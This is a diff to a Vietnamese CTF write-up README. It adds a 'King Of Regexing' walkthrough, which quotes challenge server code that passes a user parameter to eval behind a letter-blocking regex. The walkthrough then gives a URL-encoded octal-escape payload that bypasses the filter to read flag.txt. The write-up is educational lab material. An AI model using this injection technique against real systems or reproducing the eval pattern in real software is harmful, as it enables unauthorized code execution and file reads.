@@ -21,6 +21,8 @@
 - [GoToSearch](https://github.com/DucThinh47/VibloCTF-Writeups#gotosearch)
 - [Password Verify](https://github.com/DucThinh47/VibloCTF-Writeups#password-verify)
 - [FeedBack Form](https://github.com/DucThinh47/VibloCTF-Writeups#feedback-form)
+- [King Of Regexing]()
+- [Are you a robot?]()
 #### Web7
 
 ![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image0.png?raw=true)
@@ -885,6 +887,63 @@ Thử truy cập `/s3cr3t_fl4g` nhưng không có quyền, trở lại trang ch�
 Decode giá trị base64 này thì ra `user`, tôi thay vào giá trị `admin` được encode base64, truy cập thành công vào `/s3cr3t_fl4g` và lấy được flag:
 
 ![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image89.png?raw=true)
+#### King Of Regexing
+
+![img](90)
+
+Thử truy cập `/server`, server trả về đoạn code sau:
+
+![img](91)
+
+=> Endpoint `/payload` trong server:
+
+    @app.route('/payload')
+    def get_flag():
+        try:
+            if _e("[\\101-\\132\\141-\\172]", __ := _b("NFKD", request.args.get('cmd'))):
+                return "leet..."
+            return _a(__)
+        except:
+            return "leet..."
+Trong đó:
+- `_e` = re.search
+- `_b` = unicodedata.normalize
+- `_a` = eval
+- `_` = open
+
+=> Cơ chế:
+1. Server lấy tham số `cmd`
+2. Normalize với "`NFKD`"
+3. Regex kiểm tra: nếu chuỗi chứa chữ cái ASCII ([A-Z] hay [a-z]) => trả về "leet..."
+4. Nếu không có chữ cái => `eval(cmd)`.
+
+Ý nghĩa filter: Regex `[\\101-\\132\\141-\\172]` chính là dải octal:
+- `\101-\132` = A-Z
+- `\141-\172` = a-z
+
+=> Mọi payload chứa chữ cái bị chặn.
+Ví dụ: `"open"`, `"read"`, `"next"`, `"tuple"`, `"join"`… đều fail. Như vậy, tôi cần mở `flag.txt` mà không viết chữ:
+
+=> Biểu diễn "flag.txt" bằng escape octal:
+- `"flag.txt"` = `"\146\154\141\147\056\164\170\164"`
+- Dùng `_(...)` để mở file (alias của open)
+- Dùng list unpack `[*...]` để ép file object => list các dòng
+
+=> Payload gốc: `[*_("\146\154\141\147\056\164\170\164")]` => Encode thành URL:
+
+    /payload?cmd=%5B*_%28"%5C146%5C154%5C141%5C147%5C056%5C164%5C170%5C164"%29%5D
+
+![img](92)
+#### Are you a robot?
+
+File robots.txt:
+
+![img](93)
+
+![img](94)
+
+
+
 
 
 
